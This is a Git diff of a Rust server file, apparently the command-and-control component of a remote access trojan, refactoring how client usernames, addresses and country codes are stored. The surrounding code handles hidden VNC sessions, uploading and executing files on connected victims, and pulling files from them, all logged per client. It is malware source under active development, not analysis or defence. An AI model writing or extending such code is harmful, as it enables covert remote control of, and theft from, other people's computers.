@@ -6,8 +6,6 @@ use std::net::SocketAddr;
 
 use std::sync::{ Arc, Mutex };
 
-use common::packets::ClientInfo;
-
 use rsa::{RsaPrivateKey, RsaPublicKey};
 use rsa::pkcs8::EncodePublicKey;
 use rsa::rand_core::OsRng;
@@ -22,6 +20,7 @@ use common::RSA_BITS;
 
 use crate::utils::logger::Logger;
 use crate::utils::encryption::{handle_encryption_request, handle_encryption_confirm};
+use common::client_info::ClientInfo;
 
 pub struct ServerWrapper {
     receiver: Receiver<ServerCommand>,
@@ -75,7 +74,7 @@ impl ServerWrapper {
                         "Executed {} on client [{}] [{}]",
                         packet.get_type(),
                         addr,
-                        client.username
+                        client.system.username
                     ),
                 )
                 .await;
@@ -97,7 +96,7 @@ impl ServerWrapper {
                     "cmd_rcvd",
                     format!(
                         "Received {} from client [{}] [{}]",
-                        data_type, addr, client.username
+                        data_type, addr, client.system.username
                     ),
                 )
                 .await;
@@ -187,16 +186,16 @@ impl ServerWrapper {
 
                 RegisterClient(tx, addr, mut client_info) => {
                     self.txs.insert(addr, tx);
-                    client_info.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
-                    client_info.addr = Some(addr.to_string());
-                    client_info.country_code = self.get_country_code(&addr).await;
+                    client_info.data.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
+                    client_info.data.addr = Some(addr.to_string());
+                    client_info.data.country_code = self.get_country_code(&addr).await;
                     
                     self.connected_users.insert(addr, client_info.clone());
 
                     self.log_events
                         .log(
                             "client_connected",
-                            format!("Client [{}] {} connected!", addr, client_info.username),
+                            format!("Client [{}] {} connected!", addr, client_info.system.username),
                         )
                         .await;
                     self.emit_client_status(&client_info, "client_connected")
@@ -208,7 +207,7 @@ impl ServerWrapper {
                         self.log_events
                             .log(
                                 "client_disconnected",
-                                format!("Client [{}] [{}] disconnected", addr, client.username),
+                                format!("Client [{}] [{}] disconnected", addr, client.system.username),
                             )
                             .await;
                         self.emit_client_status(&client, "client_disconnected")
@@ -363,13 +362,13 @@ impl ServerWrapper {
 
                 StartHVNC(addr) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.username)).await;
+                        self.log_events.log("cmd_sent", format!("Starting HVNC on client [{}] [{}]", addr, client.system.username)).await;
                         self.send_client_packet(&addr, ClientboundPacket::StartHVNC).await  
                     }
                 }
                 StopHVNC(addr) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Stopping HVNC on client [{}] [{}]", addr, client.username)).await;
+                        self.log_events.log("cmd_sent", format!("Stopping HVNC on client [{}] [{}]", addr, client.system.username)).await;
                         self.send_client_packet(&addr, ClientboundPacket::StopHVNC).await  
                     }
                 }
@@ -380,21 +379,21 @@ impl ServerWrapper {
 
                 UploadAndExecute(addr, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.username)).await;
+                        self.log_events.log("cmd_sent", format!("Uploading and executing file {} to client [{}] [{}]", file_data.name, addr, client.system.username)).await;
                         self.send_client_packet(&addr, ClientboundPacket::UploadAndExecute(file_data)).await;
                     }
                 },
                 
                 ExecuteFile(addr, path) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.username)).await;
+                        self.log_events.log("cmd_sent", format!("Executing file {} on client [{}] [{}]", path, addr, client.system.username)).await;
                         self.send_client_packet(&addr, ClientboundPacket::ExecuteFile(path)).await;
                     }
                 },
                 
                 UploadFile(addr, target_folder, file_data) => {
                     if let Some(client) = self.connected_users.get(&addr) {
-                        self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.username)).await;
+                        self.log_events.log("cmd_sent", format!("Uploading file {} to folder {} on client [{}] [{}]", file_data.name, target_folder, addr, client.system.username)).await;
                         self.send_client_packet(&addr, ClientboundPacket::UploadFile(target_folder, file_data)).await;
                     }
                 },
@@ -519,7 +518,7 @@ impl ServerWrapper {
                                 "cmd_rcvd",
                                 format!(
                                     "Downloaded file from client [{}] [{}]",
-                                    addr, client.username
+                                    addr, client.system.username
                                 ),
                             )
                             .await;
